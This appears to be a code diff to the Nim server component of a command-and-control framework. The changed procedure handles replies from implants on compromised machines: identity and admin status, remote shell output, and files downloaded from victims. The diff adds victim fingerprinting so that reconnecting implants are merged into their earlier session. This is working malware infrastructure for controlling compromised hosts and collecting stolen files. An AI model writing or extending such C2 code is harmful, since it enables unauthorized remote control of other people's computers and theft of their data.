@@ -1,18 +1,22 @@
-import asyncdispatch, ws, asyncfutures, strutils, json, base64
+import asyncdispatch, ws, asyncfutures, strutils, strformat, json, base64, md5
 
 import types, logging, communication
 
-proc processMessage*(client: C2Client, response: JsonNode) {.async.} = 
+proc generateClientHash(c: C2Client): string =
+  getMD5(
+    fmt"{c.ipAddress}{c.hostname}{c.username}{c.osType}{$c.windowsVersionInfo}"
+  )
+
+proc processMessage*(client: ref C2Client, response: JsonNode) {.async.} = 
   let server = client.server
 
   let error = response["error"].getStr() 
   let taskId = response["taskId"].getInt(-1) 
-  
 
   if taskId > -1:
     let task = server.tasks[taskId]
     if error != "":
-      errorLog $client & ": " & error
+      errorLog $client[] & ": " & error
     else: 
       case response["task"].getStr():
       of "identify":
@@ -41,8 +45,28 @@ proc processMessage*(client: C2Client, response: JsonNode) {.async.} =
         )
         client.isAdmin = response["data"]["isAdmin"].getBool()
         client.isAdmin = response["data"]["isAdmin"].getBool()
+        client.hash = client[].generateClientHash()
+        for otherClient in server.clients:
+          if otherClient.hash == client.hash and otherClient.id != client.id:
+            let oldClientId = client.id
+          
+            # migrating client  
+            var tcpSocket = getTcpSocket(client[])
+            tcpSocket.id = otherClient.id
+            client[] = otherClient
+            client.connected = true
+            cReconnected client[]
+
+            # remove old client
+            for c in server.clients:
+              if c.id == oldClientId:
+                server.clients.delete(
+                  server.clients.find c
+                )
+
+            return
         if not client.loaded:
-          cConnected client
+          cConnected client[]
           client.loaded = true
       of "output":
         let output = response["data"]["output"].getStr()
@@ -67,14 +91,14 @@ proc processMessage*(client: C2Client, response: JsonNode) {.async.} =
               id: process["id"].getInt(0)))
         elif category == "SHELL":
           task.output = %*{"output": decode(output)}
-          logClientOutput client, category, output
+          logClientOutput client[], category, output
       of "file":
         task.output = %*{
           "file": response["data"]["path"].getStr(),
           "data": decode(response["data"]["contents"].getStr())
         }
-        infoLog "received file " & response["data"]["path"].getStr() & " from " & $client
-        logClientOutput client, "DOWNLOAD", response["data"]["contents"].getStr()
+        infoLog "received file " & response["data"]["path"].getStr() & " from " & $client[]
+        logClientOutput client[], "DOWNLOAD", response["data"]["contents"].getStr()
     task.markAsCompleted(response)
     for wsConnection in client.server.wsConnections:
       if wsConnection.readyState == Open:
@@ -83,4 +107,4 @@ proc processMessage*(client: C2Client, response: JsonNode) {.async.} =
           "data": %task
         }))
   else:
-    await client.askToIdentify()
+    await client[].askToIdentify()
